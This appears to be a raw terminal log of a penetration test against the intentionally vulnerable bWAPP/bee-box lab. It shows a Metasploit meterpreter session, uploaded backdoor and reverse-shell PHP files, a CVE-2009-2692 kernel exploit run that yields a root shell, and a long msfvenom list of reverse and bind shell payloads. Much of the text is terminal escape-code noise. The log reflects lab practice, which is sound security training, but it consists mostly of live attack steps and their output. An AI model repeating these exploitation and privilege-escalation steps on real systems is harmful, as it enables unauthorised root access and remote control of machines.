+-rw-rw-r-- 1 root www-data  4898 Nov  2  2014 sm_obu_files.php
+-rw-rw-r-- 1 root www-data  6889 Nov  2  2014 sm_robots.php
+-rw-rw-r-- 1 root www-data  5012 Nov  2  2014 sm_samba.php
+-rw-rw-r-- 1 root www-data  4726 Nov  2  2014 sm_snmp.php
+-rw-rw-r-- 1 root www-data  4751 Nov  2  2014 sm_webdav.php
+-rw-rw-r-- 1 root www-data  5078 Nov  2  2014 sm_xst.php
+-rw-rw-r-- 1 root www-data  7300 Nov  2  2014 smgmt_admin_portal.php
+-rw-rw-r-- 1 root www-data  7048 Nov  2  2014 smgmt_cookies_httponly.php
+-rw-rw-r-- 1 root www-data  7855 Nov  2  2014 smgmt_cookies_secure.php
+-rw-rw-r-- 1 root www-data  5470 Nov  2  2014 smgmt_sessionid_url.php
+-rw-rw-r-- 1 root www-data  9062 Nov  2  2014 smgmt_strong_sessions.php
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 soap
+-rw-rw-r-- 1 root www-data  7232 Nov  2  2014 sqli_1.php
+-rw-rw-r-- 1 root www-data  6595 Nov  2  2014 sqli_10-1.php
+-rw-rw-r-- 1 root www-data  1859 Nov  2  2014 sqli_10-2.php
+-rw-rw-r-- 1 root www-data  7106 Nov  2  2014 sqli_11.php
+-rw-rw-r-- 1 root www-data  8565 Nov  2  2014 sqli_12.php
+-rw-rw-r-- 1 root www-data  8671 Nov  2  2014 sqli_13-ps.php
+-rw-rw-r-- 1 root www-data  8001 Nov  2  2014 sqli_13.php
+-rw-rw-r-- 1 root www-data  6134 Nov  2  2014 sqli_14.php
+-rw-rw-r-- 1 root www-data  6405 Nov  2  2014 sqli_15.php
+-rw-rw-r-- 1 root www-data  6640 Nov  2  2014 sqli_16.php
+-rw-rw-r-- 1 root www-data  6982 Nov  2  2014 sqli_17.php
+-rw-rw-r-- 1 root www-data  8666 Nov  2  2014 sqli_2-ps.php
+-rw-rw-r-- 1 root www-data  7996 Nov  2  2014 sqli_2.php
+-rw-rw-r-- 1 root www-data  6566 Nov  2  2014 sqli_3.php
+-rw-rw-r-- 1 root www-data  5895 Nov  2  2014 sqli_4.php
+-rw-rw-r-- 1 root www-data  6458 Nov  2  2014 sqli_5.php
+-rw-rw-r-- 1 root www-data  7241 Nov  2  2014 sqli_6.php
+-rw-rw-r-- 1 root www-data  7982 Nov  2  2014 sqli_7.php
+-rw-rw-r-- 1 root www-data  5290 Nov  2  2014 sqli_8-1.php
+-rw-rw-r-- 1 root www-data  2395 Nov  2  2014 sqli_8-2.php
+-rw-rw-r-- 1 root www-data  8147 Nov  2  2014 sqli_9.php
+-rw-rw-r-- 1 root www-data  4800 Nov  2  2014 sqli_drupal.php
+-rw-rw-r-- 1 root www-data  6546 Nov  2  2014 ssii.php
+-rw-rw-r-- 1 root www-data  5322 Nov  2  2014 ssrf.php
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 stylesheets
+-rw-rw-r-- 1 root www-data   696 Nov  2  2014 test.php
+-rw-rw-r-- 1 root www-data  4845 Nov  2  2014 top_security.php
+-rw-rw-r-- 1 root www-data  4496 Nov  2  2014 training.php
+-rw-rw-r-- 1 root www-data  4469 Nov  2  2014 training_install.php
+-rw-rw-r-- 1 root www-data  6765 Nov  2  2014 unrestricted_file_upload.php
+-rw-rw-r-- 1 root www-data  7584 Nov  2  2014 unvalidated_redir_fwd_1.php
+-rw-rw-r-- 1 root www-data  5479 Nov  2  2014 unvalidated_redir_fwd_2.php
+-rw-rw-r-- 1 root www-data  4610 Nov  2  2014 user_activation.php
+-rw-rw-r-- 1 root www-data 12942 Nov  2  2014 user_extra.php
+-rw-rw-r-- 1 root www-data 11294 Nov  2  2014 user_new.php
+-rw-rw-r-- 1 root www-data  7556 Nov  2  2014 web.config
+-rw-rw-r-- 1 root www-data  1447 Nov  2  2014 ws_soap.php
+-rw-rw-r-- 1 root www-data  8577 Nov  2  2014 xmli_1.php
+-rw-rw-r-- 1 root www-data  7579 Nov  2  2014 xmli_2.php
+-rw-rw-r-- 1 root www-data  4925 Nov  2  2014 xss_ajax_1-1.php
+-rw-rw-r-- 1 root www-data  2275 Nov  2  2014 xss_ajax_1-2.php
+-rw-rw-r-- 1 root www-data  8817 Nov  2  2014 xss_ajax_2-1.php
+-rw-rw-r-- 1 root www-data  3293 Nov  2  2014 xss_ajax_2-2.php
+-rw-rw-r-- 1 root www-data  5563 Nov  2  2014 xss_back_button.php
+-rw-rw-r-- 1 root www-data  5364 Nov  2  2014 xss_custom_header.php
+-rw-rw-r-- 1 root www-data  7824 Nov  2  2014 xss_eval.php
+-rw-rw-r-- 1 root www-data  6236 Nov  2  2014 xss_get.php
+-rw-rw-r-- 1 root www-data  4787 Nov  2  2014 xss_href-1.php
+-rw-rw-r-- 1 root www-data  6920 Nov  2  2014 xss_href-2.php
+-rw-rw-r-- 1 root www-data  5912 Nov  2  2014 xss_href-3.php
+-rw-rw-r-- 1 root www-data  6012 Nov  2  2014 xss_json.php
+-rw-rw-r-- 1 root www-data  6553 Nov  2  2014 xss_login.php
+-rw-rw-r-- 1 root www-data  6268 Nov  2  2014 xss_php_self.php
+-rw-rw-r-- 1 root www-data  4785 Nov  2  2014 xss_phpmyadmin.php
+-rw-rw-r-- 1 root www-data  6232 Nov  2  2014 xss_post.php
+-rw-rw-r-- 1 root www-data  5653 Nov  2  2014 xss_referer.php
+-rw-rw-r-- 1 root www-data  4797 Nov  2  2014 xss_sqlitemanager.php
+-rw-rw-r-- 1 root www-data  9649 Nov  2  2014 xss_stored_1.php
+-rw-rw-r-- 1 root www-data  6662 Nov  2  2014 xss_stored_2.php
+-rw-rw-r-- 1 root www-data  9078 Nov  2  2014 xss_stored_3.php
+-rw-rw-r-- 1 root www-data  6517 Nov  2  2014 xss_stored_4.php
+-rw-rw-r-- 1 root www-data  5229 Nov  2  2014 xss_user_agent.php
+-rw-rw-r-- 1 root www-data  5318 Nov  2  2014 xxe-1.php
+-rw-rw-r-- 1 root www-data  2530 Nov  2  2014 xxe-2.php
+^[[A      ls -l | grep ^d
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 admin
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 apps
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 db
+drwxrwxrwx 2 root www-data  4096 Aug 18 15:16 documents
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 fonts
+drwxrwxrwx 2 root www-data  4096 Nov  2  2014 images
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 js
+drwxrwxrwx 2 root www-data  4096 Nov  2  2014 logs
+drwxrwxrwx 2 root www-data  4096 Nov  2  2014 passwords
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 soap
+drwxrwxr-x 2 root www-data  4096 Nov  2  2014 stylesheets
+cd ..
+^[[A^[[A        ls -l | grep ^d
+drwxrwxr-x 13 root     www-data   12288 Nov  2  2014 bWAPP
+drwxrwxr-x 13 root     www-data   12288 Nov  3  2014 bWAPP_BAK
+drwxrwxr-x  9 root     www-data    4096 Nov  2  2014 drupal
+drwxrwxr-x  2 root     www-data    4096 Nov  2  2014 evil
+drwxrwxr-x  8 www-data www-data    4096 May 11  2014 sqlite
+cd  pwd
+/var/www
+cd e    dinf    fing   d . -type d f -ba  name cve*.tat r
+./evil/cve-2009-2692.tar
+./bWAPP/documents/cve-2009-2692.tar
+^C
+Terminate channel 5? [y/N]  n
+[1m[31m[-][0m core_channel_interact: Operation failed: 1
+[4mmeterpreter[0m > shell 
+[0mProcess 16332 created.
+Channel 6 created.
+
+pd wd
+/var/www/bWAPP/documents
+ls
+Iron_Man.pdf
+Terminator_Salvation.pdf
+The_Amazing_Spider-Man.pdf
+The_Cabin_in_the_Woods.pdf
+The_Dark_Knight_Rises.pdf
+The_Incredible_Hulk.pdf
+bWAPP_intro.pdf
+backdoor.php
+cve-2009-2692.tar
+msf_http_put_test.txt
+nc_traffic
+payload.php
+payload2.php
+qwerty.php
+reverse_tcp_payload.php
+tar xf x	 cve-2009-2692.tar
+ls
+Iron_Man.pdf
+Terminator_Salvation.pdf
+The_Amazing_Spider-Man.pdf
+The_Cabin_in_the_Woods.pdf
+The_Dark_Knight_Rises.pdf
+The_Incredible_Hulk.pdf
+bWAPP_intro.pdf
+backdoor.php
+cve-2009-2692
+cve-2009-2692.tar
+msf_http_put_test.txt
+nc_traffic
+payload.php
+payload2.php
+qwerty.php
+reverse_tcp_payload.php
+ls -l 
+total 8364
+-rw-rw-r-- 1 root     www-data  543803 Nov  2  2014 Iron_Man.pdf
+-rw-rw-r-- 1 root     www-data  462949 Nov  2  2014 Terminator_Salvation.pdf
+-rw-rw-r-- 1 root     www-data  544600 Nov  2  2014 The_Amazing_Spider-Man.pdf
+-rw-rw-r-- 1 root     www-data  526187 Nov  2  2014 The_Cabin_in_the_Woods.pdf
+-rw-rw-r-- 1 root     www-data  756522 Nov  2  2014 The_Dark_Knight_Rises.pdf
+-rw-rw-r-- 1 root     www-data  618117 Nov  2  2014 The_Incredible_Hulk.pdf
+-rw-rw-r-- 1 root     www-data 5010042 Nov  2  2014 bWAPP_intro.pdf
+-rw-r--r-- 1 www-data www-data     136 Aug 18 13:20 backdoor.php
+drwxr-xr-x 2 www-data www-data    4096 May  4  2014 cve-2009-2692
+-rw-r--r-- 1 www-data www-data   20480 Aug 18 15:16 cve-2009-2692.tar
+-rw-r--r-- 1 www-data www-data      13 Aug 18 13:35 msf_http_put_test.txt
+-rw-r--r-- 1 ftp      nogroup      690 Aug 17 23:33 nc_traffic
+-rw-r--r-- 1 www-data www-data    3024 Aug 18 14:42 payload.php
+-rw-r--r-- 1 www-data www-data    1112 Aug 18 14:59 payload2.php
+-rw-r--r-- 1 www-data www-data     162 Aug 18 13:17 qwerty.php
+-rw-r--r-- 1 www-data www-data    1112 Aug 18 15:08 reverse_tcp_payload.php
+cd cve-2009-2692
+ls
+cve-2009-2692.sh
+exploit.c
+pwnkernel.c
+bash c	 cve-2009-2692.sh
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM front:0
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM surround40:0
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM surround41:0
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM surround50:0
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM surround51:0
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM surround71:0
+ALSA lib pcm_hw.c:1207:(_snd_pcm_hw_open) Invalid value for card
+E: alsa-util.c: Error opening PCM device hw:0: No such file or directory
+E: module.c: Failed to load  module "module-alsa-sink" (argument: "device_id=0 sink_name=alsa_output.pci_1274_1371_sound_card_0_alsa_playback_0"): initialization failed.
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM front:0
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM surround40:0
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM surround41:0
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM surround50:0
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM surround51:0
+ALSA lib conf.c:3952:(snd_config_expand) Unknown parameters 0
+ALSA lib pcm.c:2145:(snd_pcm_open_noupdate) Unknown PCM surround71:0
+ALSA lib pcm_hw.c:1207:(_snd_pcm_hw_open) Invalid value for card
+E: alsa-util.c: Error opening PCM device hw:0: No such file or directory
+E: module.c: Failed to load  module "module-alsa-source" (argument: "device_id=0 source_name=alsa_input.pci_1274_1371_sound_card_0_alsa_capture_0"): initialization failed.
+E: x11wrap.c: XOpenDisplay() failed
+E: module.c: Failed to load  module "module-x11-publish" (argument: ""): initialization failed.
+/bin/sh: can't access tty; job control turned off
+# whoami
+root
+# ^Z
+Background channel 6? [y/N]  n
+^Z
+Background channel 6? [y/N]  y
+[4mmeterpreter[0m > bg[H[2J[4mmeterpreter[0m > bg
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                   Information              Connection
+  --  ----  ----                   -----------              ----------
+  1         meterpreter php/linux  www-data (33) @ bee-box  10.10.10.10:4444 -> 10.10.10.6:46897 (10.10.10.6)
+
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> 
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ msf[Kfvenom [K[K[K[K[K[K[K[K[Kman msfvenom 
+[?1049h[22;0;0t[?1h=MSFVENOM(1)                                       Metasploit Framework - msfvenom                                       MSFVENOM(1)[m
+[m
+[1mNAME[0m[m
+       msfvenom - Payload Generator and Encoder[m
+[m
+[1mSYNOPSIS[0m[m
+       msfvenom [options] <var=val>[m
+[m
+[1mDESCRIPTION[0m[m
+       [1mMsfvenom[0m  is  a  combination  of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. Ms‐[m
+       fvenom has replaced both msfpayload and msfencode as of [1mJune[0m [1m8th,[0m [1m2015.[0m[m
+[m
+[1mOPTIONS[0m[m
+       -p, --payload [payload]  Payload to use. Specify a '-' or stdin to use custom payloads[m
+           --payload-options    List the payload's standard options[m
+[m
+       -l, --list  [module_type][m
+              List a module type example: payloads, encoders, nops, all[m
+[m
+       -n, --nopsled  [length][m
+              Prepend a nopsled of [length] size on to the payload[m
+[m
+       -f, --format  [format][m
+              Output format (use --help-formats for a list)[m
+[m
+       --help-formats[m
+              List available formats[m
+[m
+       -e, --encoder  [encoder][m
+              The encoder to use[m
+[m
+       -a, --arch  [architecture][m
+              The architecture to use[m
+[7m Manual page msfvenom(1) line 1 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page msfvenom(1) line 2 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       --platform   [platform][m
+[7m Manual page msfvenom(1) line 3 (press h for help or q to quit)[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ msfvenom -p --list[K[K[K[K[K[K[K[K-list payloads | less
+[?1049h[22;0;0t[?1h=[K:[K...skipping...
+[1mTraceback[m (most recent call last):
+        29: from /usr/bin/msfvenom:403:in `<main>'
+        28: from /usr/bin/msfvenom:403:in `each'
+        27: from /usr/bin/msfvenom:406:in `block in <main>'
+        26: from /usr/bin/msfvenom:341:in `dump_payloads'
+        25: from /usr/share/metasploit-framework/lib/msf/core/module_set.rb:93:in `each_module'
+        24: from /usr/share/metasploit-framework/lib/msf/core/module_set.rb:246:in `each_module_list'
+        23: from /usr/share/metasploit-framework/lib/msf/core/module_set.rb:246:in `each'
+        22: from /usr/share/metasploit-framework/lib/msf/core/module_set.rb:273:in `block in each_module_list'
+        21: from /usr/bin/msfvenom:344:in `block in dump_payloads'
+        20: from /usr/bin/msfvenom:344:in `new'
+        19: from /usr/share/metasploit-framework/modules/payloads/stages/windows/x64/shell.rb:15:in `initialize'
+        18: from /usr/share/metasploit-framework/lib/msf/base/sessions/command_shell_options.rb:16:in `initialize'
+        17: from /usr/share/metasploit-framework/modules/payloads/stagers/windows/x64/bind_ipv6_tcp.rb:21:in `initialize'
+        16: from /usr/share/metasploit-framework/lib/msf/core/payload/windows.rb:59:in `initialize'
+        15: from /usr/share/metasploit-framework/lib/msf/core/payload/windows/prepend_migrate.rb:15:in `initialize'
+        14: from /usr/share/metasploit-framework/lib/msf/core/payload/stager.rb:16:in `initialize'
+        13: from /usr/share/metasploit-framework/lib/msf/core/payload/uuid/options.rb:15:in `initialize'
+        12: from /usr/share/metasploit-framework/lib/msf/core/payload/pingback/options.rb:12:in `initialize'
+        11: from /usr/share/metasploit-framework/lib/msf/core/handler/bind_tcp.rb:45:in `initialize'
+        10: from /usr/share/metasploit-framework/lib/msf/core/handler.rb:76:in `initialize'
+         9: from /usr/share/metasploit-framework/lib/msf/core/payload.rb:71:in `initialize'
+         8: from /usr/share/metasploit-framework/lib/msf/core/module.rb:138:in `initialize'
+         7: from /usr/share/metasploit-framework/lib/msf/core/module/options.rb:47:in `register_advanced_options'
+         6: from /usr/share/metasploit-framework/lib/msf/core/option_container.rb:180:in `add_advanced_options'
+         5: from /usr/share/metasploit-framework/lib/msf/core/option_container.rb:128:in `add_options'
+         4: from /usr/share/metasploit-framework/lib/msf/core/option_container.rb:147:in `add_options_array'
+         3: from /usr/share/metasploit-framework/lib/msf/core/option_container.rb:147:in `each'
+         2: from /usr/share/metasploit-framework/lib/msf/core/option_container.rb:148:in `block in add_options_array'
+         1: from /usr/share/metasploit-framework/lib/msf/core/option_container.rb:156:in `add_option'
+/usr/share/metasploit-framework/lib/msf/core/option_container.rb:156:in `kind_of?': [1;4mInterrupt[m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ msfvenom --list payloads | less[K[K[K[K[K[K
+
+Framework Payloads (566 total) [--payload <value>]
+==================================================
+
+    Name                                                Description
+    ----                                                -----------
+    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
+    aix/ppc/shell_find_port                             Spawn a shell on an established connection
+    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)
+    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
+    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
+    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
+    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
+    android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
+    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
+    android/shell/reverse_http                          Spawn a piped command shell (sh). Tunnel communication over HTTP
+    android/shell/reverse_https                         Spawn a piped command shell (sh). Tunnel communication over HTTPS
+    android/shell/reverse_tcp                           Spawn a piped command shell (sh). Connect back stager
+    apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)
+    apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)
+    apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)
+    apple_ios/aarch64/shell_reverse_tcp                 Connect back to attacker and spawn a command shell
+    apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)
+    apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)
+    apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)
+    bsd/sparc/shell_bind_tcp                            Listen for a connection and spawn a command shell
+    bsd/sparc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
+    bsd/vax/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+    bsd/x64/exec                                        Execute an arbitrary command
+    bsd/x64/shell_bind_ipv6_tcp                         Listen for a connection and spawn a command shell over IPv6
+    bsd/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port
+    bsd/x64/shell_bind_tcp_small                        Listen for a connection and spawn a command shell
+    bsd/x64/shell_reverse_ipv6_tcp                      Connect back to attacker and spawn a command shell over IPv6
+    bsd/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+    bsd/x64/shell_reverse_tcp_small                     Connect back to attacker and spawn a command shell
+    bsd/x86/exec                                        Execute an arbitrary command
+    bsd/x86/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service
+    bsd/x86/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service
+    bsd/x86/shell/bind_ipv6_tcp                         Spawn a command shell (staged). Listen for a connection over IPv6
+    bsd/x86/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection
+    bsd/x86/shell/find_tag                              Spawn a command shell (staged). Use an established connection
+    bsd/x86/shell/reverse_ipv6_tcp                      Spawn a command shell (staged). Connect back to the attacker over IPv6
+    bsd/x86/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker
+    bsd/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell
+    bsd/x86/shell_bind_tcp_ipv6                         Listen for a connection and spawn a command shell over IPv6
+    bsd/x86/shell_find_port                             Spawn a shell on an established connection
+    bsd/x86/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)
+    bsd/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+    bsd/x86/shell_reverse_tcp_ipv6                      Connect back to attacker and spawn a command shell over IPv6
+    bsdi/x86/shell/bind_tcp                             Spawn a command shell (staged). Listen for a connection
+    bsdi/x86/shell/reverse_tcp                          Spawn a command shell (staged). Connect back to the attacker
+    bsdi/x86/shell_bind_tcp                             Listen for a connection and spawn a command shell
+    bsdi/x86/shell_find_port                            Spawn a shell on an established connection
+    bsdi/x86/shell_reverse_tcp                          Connect back to attacker and spawn a command shell
+    cmd/mainframe/apf_privesc_jcl                       (Elevate privileges for user. Adds SYSTEM SPECIAL and BPX.SUPERUSER to user profile. Does this by using an unsecured/updateable APF authorized library (APFLIB) and updating the user's ACEE using this program/library. Note: This privesc only works with z/OS systems using RACF, no other ESM is supported.)
+    cmd/mainframe/bind_shell_jcl                        Provide JCL which creates a bind shell This implmentation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.
+    cmd/mainframe/generic_jcl                           Provide JCL which can be used to submit a job to JES2 on z/OS which will exit and return 0. This can be used as a template for other JCL based payloads
+    cmd/mainframe/reverse_shell_jcl                     Provide JCL which creates a reverse shell This implementation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.
+    cmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK
+    cmd/unix/bind_busybox_telnetd                       Listen for a connection and spawn a command shell via BusyBox telnetd
+    cmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)
+    cmd/unix/bind_jjs                                   Listen for a connection and spawn a command shell via jjs
+    cmd/unix/bind_lua                                   Listen for a connection and spawn a command shell via Lua
+    cmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat
+    cmd/unix/bind_netcat_gaping                         Listen for a connection and spawn a command shell via netcat
+    cmd/unix/bind_netcat_gaping_ipv6                    Listen for a connection and spawn a command shell via netcat
+    cmd/unix/bind_nodejs                                Continually listen for a connection and spawn a command shell via nodejs
+    cmd/unix/bind_perl                                  Listen for a connection and spawn a command shell via perl
+    cmd/unix/bind_perl_ipv6                             Listen for a connection and spawn a command shell via perl
+    cmd/unix/bind_r                                     Continually listen for a connection and spawn a command shell via R
+    cmd/unix/bind_ruby                                  Continually listen for a connection and spawn a command shell via Ruby
+    cmd/unix/bind_ruby_ipv6                             Continually listen for a connection and spawn a command shell via Ruby
+    cmd/unix/bind_socat_udp                             Creates an interactive shell via socat
+    cmd/unix/bind_stub                                  Listen for a connection and spawn a command shell (stub only, no payload)
+    cmd/unix/bind_zsh                                   Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.
+    cmd/unix/generic                                    Executes the supplied command
+    cmd/unix/interact                                   Interacts with a shell on an established socket connection
+    cmd/unix/pingback_bind                              Accept a connection, send a UUID, then exit
+    cmd/unix/pingback_reverse                           Creates a socket, send a UUID, then exit
+    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections
+    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK
+    cmd/unix/reverse_bash                               Creates an interactive shell via bash's builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.
+    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the '-z' option included on some systems to encrypt using SSL.
+    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash's builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.
+    cmd/unix/reverse_jjs                                Connect back and create a command shell via jjs
+    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn't usually installed by default.
+    cmd/unix/reverse_lua                                Creates an interactive shell via Lua
+    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode
+    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat
+    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat
+    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs
+    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections
+    cmd/unix/reverse_perl                               Creates an interactive shell via perl
+    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL
+    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL
+    cmd/unix/reverse_python                             Connect back and create a command shell via Python
+    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
+    cmd/unix/reverse_r                                  Connect back and create a command shell via R
+    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby
+    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL
+    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat
